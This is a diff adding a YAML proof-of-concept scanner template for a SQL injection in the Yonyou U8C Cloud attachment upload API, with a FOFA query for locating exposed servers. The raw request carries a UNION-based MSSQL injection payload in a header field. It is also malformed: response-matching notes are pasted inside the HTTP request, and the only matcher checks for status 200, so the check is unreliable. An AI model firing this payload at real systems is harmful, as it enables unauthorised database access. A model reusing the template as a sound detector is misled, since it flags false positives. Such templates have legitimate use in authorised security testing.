@@ -1,0 +1,52 @@
+id: poc-zttgst4eahmrhreg
+info:
+  name: 用友-U8C-Cloud-upload-sql漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zttgst4eahmrhreg'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zttgst4eahmrhreg
+    fofa: app="用友-NC-Cloud"或header="nccloud"
+http:
+- raw:
+  - 'POST /u8cloud/api/hr/attachment/upload?mssql_error HTTP/1.1
+
+
+    Content-Type: application/json
+
+
+    system: 1'' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(106)+CHAR(120)+CHAR(112)+CHAR(113)+ISNULL(CAST(111*111 AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(120)+CHAR(113)+CHAR(120)+CHAR(113),NULL-- QIwq
+
+
+    trantype: pk
+
+
+    isEncrypt: N
+
+
+    sign: token
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?12321)(?=.*?errorcode).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
